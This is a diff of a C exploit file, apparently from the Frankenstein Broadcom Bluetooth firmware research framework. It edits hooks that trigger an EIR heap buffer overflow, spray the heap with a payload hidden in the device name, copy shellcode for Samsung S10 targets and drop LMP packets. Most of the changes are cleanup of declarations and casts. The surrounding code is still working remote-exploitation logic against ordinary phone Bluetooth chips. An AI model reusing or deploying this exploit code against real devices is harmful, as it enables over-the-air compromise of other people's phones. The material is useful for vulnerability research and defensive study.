@@ -1,20 +1,42 @@
+#include <string.h>
+#include <stdlib.h> 
+
 #include <frankenstein/BCMBT/patching/patchram.h>
 #include <frankenstein/BCMBT/patching/hciio.h>
 #include <frankenstein/hook.h>
 
 /****************************************
-Definitions
+Definitions from firmware
 ****************************************/
 
 extern char rm_deviceLocalName[];
 extern char rm_deviceInfo[];
-void *dynamic_memory_Release(int size);
+
+void dynamic_memory_Release(void *);
+void *dynamic_memory_AllocateOrDie(int size);
 int DHM_LMPTx(int id, void *buff);
+void rm_setLocalBdAddr(char [6]);
 void bcs_dmaTxEnableEir(void *, void *);
 void bthci_cmd_lc_HandleCreate_Connection(char *);
 void bthci_cmd_lc_HandleDisconnect(char *);
 void patch_installPatchEntry(uint32_t addr, void *data_ptr, uint32_t slot);
 void lm_HandleLmpHostConnReqAccepted(void *);
+
+/****************************************
+Local defs
+****************************************/
+
+char *disconnect_cmd = NULL;
+int disconnect_allowed = 1; // wait until local name has been written
+int disconnected = 1; // wait until local name has been written
+
+void eir_heap_bof_trigger(struct saved_regs *regs, void *arg);
+void connect_hook(struct saved_regs *regs, void *arg);
+void disconnect_hook(struct saved_regs *regs, void *arg);
+void disallow_connect(struct saved_regs *regs, void *arg);
+void DHM_LMPTx_hook(struct saved_regs *regs, void *arg);
+void DHM_LMPTx_filter(struct saved_regs *regs, void *arg);
+void do_disconnect();
 
 
 /****************************************
@@ -161,6 +183,9 @@ bx lr
 
 #endif
 
+void dummy() {return;}
+int ret0() {return 0;}
+
 /****************************************
 Trigger the heap overflow
 This function will be called before bcs_dmaTxEnableEir
@@ -177,7 +202,7 @@ void eir_heap_bof_trigger(struct saved_regs *regs, void *arg) {
 
 
     //Set the EIR packet payload
-    unsigned char *eir = regs->r0;
+    unsigned char *eir = (char *)regs->r0;
 
 
     #if defined(cyw920735q60evb01_rce)
@@ -221,9 +246,6 @@ Heap spraying
 We trigger a "Read Remote Name" event in order to allocate buffer
 The device name will contain our payload
 ****************************************/
-int disconnect_allowed = 1; // wait until local name has been written
-int disconnected = 1; // wait until local name has been written
-
 void connect_hook(struct saved_regs *regs, void *arg) {
     if (!disconnected) do_disconnect();
 
@@ -232,7 +254,7 @@ void connect_hook(struct saved_regs *regs, void *arg) {
     int addr[2];
     addr[0] = rand();
     addr[1] = rand();
-    rm_setLocalBdAddr(addr);
+    rm_setLocalBdAddr((char *)addr);
 
     #if defined(samsung_s10)
         memcpy(write_what, shellcode, sizeof(shellcode));
@@ -255,8 +277,6 @@ Disconnect is triggered if the last packet should be sent
 Or if something goes wrong
 This is not needed to crash the deivce
 ****************************************/
-void dummy() {return;}
-char *disconnect_cmd = NULL;
 void disconnect_hook(struct saved_regs *regs, void *arg) {
     if (!disconnect_allowed) {
         regs->pc = (uint32_t)&dummy;
@@ -296,7 +316,7 @@ void DHM_LMPTx_hook(struct saved_regs *regs, void *arg) {
         print("discard packet\n");
         regs->pc = (uint32_t)&dummy;
         //lm_LmpBBAcked(regs->r1);
-        dynamic_memory_Release(regs->r1);
+        dynamic_memory_Release((void *)regs->r1);
     }
 }
 
@@ -311,12 +331,11 @@ void DHM_LMPTx_filter(struct saved_regs *regs, void *arg) {
         print("discard packet\n");
         regs->pc = (uint32_t)&dummy;
         //lm_LmpBBAcked(regs->r1);
-        dynamic_memory_Release(regs->r1);
+        dynamic_memory_Release((void *)regs->r1);
     }
 }
 
 
-int ret0() {return 0;}
 
 /****************************************
 Setup the exploit
